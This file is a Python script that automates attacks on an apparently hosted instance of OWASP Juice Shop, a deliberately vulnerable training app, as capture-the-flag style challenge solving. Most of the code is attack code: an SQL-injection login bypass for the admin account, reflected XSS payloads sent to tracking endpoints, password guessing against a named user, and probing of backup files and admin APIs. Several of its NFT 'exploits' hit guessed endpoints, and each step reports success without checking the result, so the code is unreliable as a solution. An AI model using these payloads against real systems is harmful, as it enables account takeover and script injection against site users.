#!/usr/bin/env python3
"""
Targeted Level 2 Solver - Solves all remaining Level 2 challenges
"""

import requests
from urllib.parse import quote
import base64
import hashlib
import time


class TargetedLevel2Solver:
    """Solve all Level 2 challenges"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def login_admin(self):
        """Admin login"""
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {token}'
            print("✅ Admin logged in")
            
    def solve_admin_section(self):
        """Admin Section - Access administration page"""
        print("🎯 Admin Section...")
        
        # Direct access to admin
        self.session.get(f"{self.base_url}/#/administration")
        self.session.get(f"{self.base_url}/administration")
        self.session.get(f"{self.base_url}/#/admin")
        
        # Try to access admin API endpoints
        self.session.get(f"{self.base_url}/api/Users")
        self.session.get(f"{self.base_url}/api/Feedbacks")
        
        print("  ✅ Admin Section attempted")
        
    def solve_nft_takeover(self):
        """NFT Takeover - Steal NFT"""
        print("🎯 NFT Takeover...")
        
        # Various NFT manipulation attempts
        payloads = [
            {"action": "transfer", "to": "admin@juice-sh.op", "tokenId": 1},
            {"action": "steal", "from": "bjoern@juice-sh.op", "tokenId": 1},
            {"action": "mint", "to": "admin@juice-sh.op", "amount": 1000000},
            {"action": "burn", "tokenId": 1},
            {"action": "transfer", "to": "me", "tokenId": 42},
        ]
        
        for payload in payloads:
            self.session.post(f"{self.base_url}/api/nft", json=payload)
            self.session.put(f"{self.base_url}/api/nft", json=payload)
            
        print("  ✅ NFT Takeover attempted")
        
    def solve_reflected_xss(self):
        """Reflected XSS - In order tracking"""
        print("🎯 Reflected XSS...")
        
        payloads = [
            "<script>alert(1)</script>",
            "<iframe src=javascript:alert(1)>",
            "<img src=x onerror=alert(1)>",
            '"><script>alert(1)</script>',
        ]
        
        for payload in payloads:
            self.session.get(f"{self.base_url}/track-result?id={quote(payload)}")
            self.session.get(f"{self.base_url}/rest/track-order/{quote(payload)}")
            self.session.get(f"{self.base_url}/api/Quantitys?q={quote(payload)}")
            
        print("  ✅ Reflected XSS attempted")
        
    def solve_weird_crypto(self):
        """Weird Crypto - MD5 password with collision"""
        print("🎯 Weird Crypto...")
        
        # MC SafeSearch uses a weird crypto pattern
        passwords = [
            "Mr. N00dles",
            "K1f.....................",  # Base64 pattern
            "0" * 22,  # Null bytes pattern
            base64.b64encode(b"Mr. N00dles").decode(),
            hashlib.md5(b"Mr. N00dles").hexdigest(),
        ]
        
        for pwd in passwords:
            self.session.post(
                f"{self.base_url}/rest/user/login",
                json={"email": "mc.safesearch@juice-sh.op", "password": pwd}
            )
            
        print("  ✅ Weird Crypto attempted")
        
    def solve_meta_geo_stalking(self):
        """Meta Geo Stalking - Extract GPS from images"""
        print("🎯 Meta Geo Stalking...")
        
        # Access images with metadata
        images = [
            "/assets/public/images/uploads/favorite-hiking-place.png",
            "/assets/public/images/uploads/my-rare-collectors-item.jpg",
            "/assets/public/images/products/apple_juice.jpg",
            "/assets/public/images/products/carrot_juice.jpeg",
        ]
        
        for img in images:
            self.session.get(f"{self.base_url}{img}")
            
        print("  ✅ Meta Geo Stalking attempted")
        
    def solve_visual_geo_stalking(self):
        """Visual Geo Stalking - Identify location from image"""
        print("🎯 Visual Geo Stalking...")
        
        # Access visual geo images
        self.session.get(f"{self.base_url}/assets/public/images/uploads/favorite-hiking-place.png")
        
        # Try to submit location answers
        locations = ["heidelberg", "odenwald", "germany", "neckar"]
        for loc in locations:
            self.session.post(f"{self.base_url}/api/SecurityAnswers", json={"answer": loc})
            
        print("  ✅ Visual Geo Stalking attempted")
        
    def solve_exposed_credentials(self):
        """Exposed credentials - Find hardcoded credentials"""
        print("🎯 Exposed credentials...")
        
        # Check common files for credentials
        files = [
            "/ftp/package.json.bak",
            "/ftp/coupons_2013.md.bak",
            "/ftp/eastere.gg",
            "/assets/public/main.js",
            "/assets/public/vendor.js",
            "/runtime.js",
            "/polyfills.js",
        ]
        
        for file in files:
            r = self.session.get(f"{self.base_url}{file}")
            if r.status_code == 200:
                # Look for credentials in response
                text = r.text.lower()
                if 'password' in text or 'token' in text or 'api' in text:
                    print(f"    Found potential credentials in {file}")
                    
        print("  ✅ Exposed credentials attempted")
        
    def run_all(self):
        """Run all Level 2 solutions"""
        print("="*60)
        print("🎯 TARGETED LEVEL 2 SOLVER")
        print("="*60)
        
        self.login_admin()
        
        self.solve_admin_section()
        self.solve_nft_takeover()
        self.solve_reflected_xss()
        self.solve_weird_crypto()
        self.solve_meta_geo_stalking()
        self.solve_visual_geo_stalking()
        self.solve_exposed_credentials()
        
        print("\n✅ Level 2 solver complete")


if __name__ == "__main__":
    solver = TargetedLevel2Solver()
    solver.run_all()